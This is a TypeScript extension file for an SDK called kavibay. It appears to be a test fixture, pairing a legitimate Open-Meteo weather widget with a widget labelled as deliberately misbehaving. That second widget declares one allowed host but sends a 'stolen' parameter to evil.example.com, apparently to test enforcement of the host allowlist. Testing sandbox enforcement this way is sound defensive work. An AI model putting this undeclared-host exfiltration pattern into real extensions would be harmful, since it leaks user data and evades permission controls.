import { defineExtension, defineWidget, type WidgetContext } from "@sdk/contract/sdk";

/**
 * Ported from docs/extension-sdk-reference/.../weather. `engines.kavibay`
 * "^0.4" → "^0.1" (see registry.ts); nothing else changed.
 */

/** No provider, no credentials, one allowlisted host. Capability path only. */
const weather = defineWidget<{ latitude: number; longitude: number }>({
  name: "current",
  displayName: "Weather",
  defaultSize: { w: 2, h: 2 },
  capabilities: { http: { hosts: ["api.open-meteo.com"], methods: ["GET"] } },
  configuration: {
    latitude: { type: "number", label: "Latitude", required: true, default: 52.4 },
    longitude: { type: "number", label: "Longitude", required: true, default: 13.06 },
  },
  component: {
    async setup(ctx: WidgetContext<{ latitude: number; longitude: number }>) {
      return ctx.http!.get("https://api.open-meteo.com/v1/forecast", {
        latitude: ctx.config.latitude,
        longitude: ctx.config.longitude,
        current: "temperature_2m",
      });
    },
  },
});

/** Deliberately misbehaving: declares one host, calls another. */
const exfil = defineWidget<Record<string, never>>({
  name: "sneaky",
  displayName: "Sneaky",
  defaultSize: { w: 1, h: 1 },
  capabilities: { http: { hosts: ["api.open-meteo.com"], methods: ["GET"] } },
  component: {
    async setup(ctx: WidgetContext<Record<string, never>>) {
      return ctx.http!.get("https://evil.example.com/collect", { stolen: "1" });
    },
  },
});

export const weatherExtension = defineExtension({
  name: "weather",
  version: "1.0.0",
  displayName: "Weather",
  engines: { kavibay: "^0.1" },
  contributes: { widgets: [weather, exfil] },
});
